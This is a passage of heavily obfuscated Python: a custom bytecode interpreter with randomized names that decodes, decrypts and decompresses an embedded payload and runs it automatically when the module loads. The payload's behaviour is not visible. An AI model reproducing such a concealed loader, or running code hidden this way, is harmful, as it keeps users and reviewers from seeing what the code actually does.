_xrc5b, 63102: _xyb80, 58691: _xbebd, 58984: _xg6b0, 59109: _da361, 61788: _xzffd, 63168: _de874, 63406: _xta3c, 62065: _xv1ce, 59262: _xqd53, 62098: _xq8cd, 62963: _xzccc, 58742: _xtf88, 62143: _xs848, 64140: _xr60a, 59138: _de874, 61859: _xna27, 65169: _xc455, 62886: _xc916, 64783: _xe7d5, 64298: _xjf45, 65290: _xt537, 62047: _xwcc8, 61808: _xk133, 63040: _xz437, 58754: _xy1b3, 63670: _xf48b, 63946: _de874, 61965: _xy9e2, 62986: _xh3bd, 65480: _du9f7, 63301: _xu968}
_mb7uhpyk = None
def _g77zwwbtgp(frame):
   global _mb7uhpyk; old_frame = _mb7uhpyk; _mb7uhpyk = frame; _t70a2f1xz = []
   try:
      code = frame._fcg8x2fh; instructions = code.instructions; consts = code.consts; names = code.names
      stack = frame._eiwfh3nm; fastlocals = frame._wdtzcyob; globals_dict = frame._t8spp8tk
      locals_dict = frame._wlbzr3l1vl; builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
         builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
         builtins_dict = builtins_dict.__dict__
      def _pht7ud48sv(new_f):
         nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
         _t70a2f1xz.append(frame); frame = new_f; code = frame._fcg8x2fh; instructions = code.instructions
         consts = code.consts; names = code.names; stack = frame._eiwfh3nm; fastlocals = frame._wdtzcyob
         globals_dict = frame._t8spp8tk; locals_dict = frame._wlbzr3l1vl
         builtins_dict = globals_dict.get('__builtins__')
         if isinstance(builtins_dict, type(_sys)):
            builtins_dict = builtins_dict.__dict__
         elif hasattr(builtins_dict, '__dict__'):
            builtins_dict = builtins_dict.__dict__
         return True
      def _uxraf96x(val):
         nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
         if _t70a2f1xz:
            frame = _t70a2f1xz.pop(); code = frame._fcg8x2fh; instructions = code.instructions
            consts = code.consts; names = code.names; stack = frame._eiwfh3nm; fastlocals = frame._wdtzcyob
            globals_dict = frame._t8spp8tk; locals_dict = frame._wlbzr3l1vl
            builtins_dict = globals_dict.get('__builtins__')
            if isinstance(builtins_dict, type(_sys)):
               builtins_dict = builtins_dict.__dict__
            elif hasattr(builtins_dict, '__dict__'):
               builtins_dict = builtins_dict.__dict__
            stack.append(val); return True
         return False
      while frame._dhcswun8d in instructions:
         opcode, arg = instructions[frame._dhcswun8d]; frame._dhcswun8d += 11
         try:
            h = _dT_c261.get(opcode ^ 62503)
            if h:
               res = h(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts)
               if res is _RET_SIGNAL:
                  if _uxraf96x(frame._c61jj55bfr):
                     continue
                  return frame._c61jj55bfr
            if frame._xhsywu9vo is not None:
               _r6ui6ci2lt = frame._xhsywu9vo; frame._xhsywu9vo = None; _pht7ud48sv(_r6ui6ci2lt); continue
         except Exception as exc:
            handled = False
            while True:
               while frame._lh35jtd7rf:
                  b = frame._lh35jtd7rf.pop()
                  if b.type == _fy7vv2tw8.WITH:
                     del stack[b.stack_height:]; suppress = False
                     if b.exit_fn:
                        try:
                           suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
                        except Exception:
                           suppress = False
                     if suppress:
                        frame._dhcswun8d = b.handler_pc; handled = True; break
                  elif b.type in (_fy7vv2tw8.EXCEPT, _fy7vv2tw8.FINALLY):
                     del stack[b.stack_height:]; stack.append(exc); frame._dhcswun8d = b.handler_pc
                     handled = True; break
               if handled:
                  break
               if _t70a2f1xz:
                  frame = _t70a2f1xz.pop(); code = frame._fcg8x2fh; instructions = code.instructions
                  consts = code.consts; names = code.names; stack = frame._eiwfh3nm
                  fastlocals = frame._wdtzcyob; globals_dict = frame._t8spp8tk
                  locals_dict = frame._wlbzr3l1vl; builtins_dict = globals_dict.get('__builtins__')
                  if isinstance(builtins_dict, type(_sys)):
                     builtins_dict = builtins_dict.__dict__
                  elif hasattr(builtins_dict, '__dict__'):
                     builtins_dict = builtins_dict.__dict__
               else:
                  break
            if not handled:
               raise
      return None
   finally:
      _mb7uhpyk = old_frame
def _ylom76u8nw():
   _psn = _ii3dym4jsv(); decrypted = _ewmcmyvz(_b64.b85decode(_pmevhyzpq()), _zz16qk7xa())
   raw = _zlib.decompress(decrypted); reader = _tzu01lwm9o(raw); root_code = _v5o0lamei(reader); g = globals()
   if '__builtins__' not in g:
      g['__builtins__'] = _builtins
   f = _b0l6wgsgx0(root_code, g, locals_dict=g)
   if _psn:
      f._eyeefn8mp ^= _psn
   return _g77zwwbtgp(f)
_ylom76u8nw()
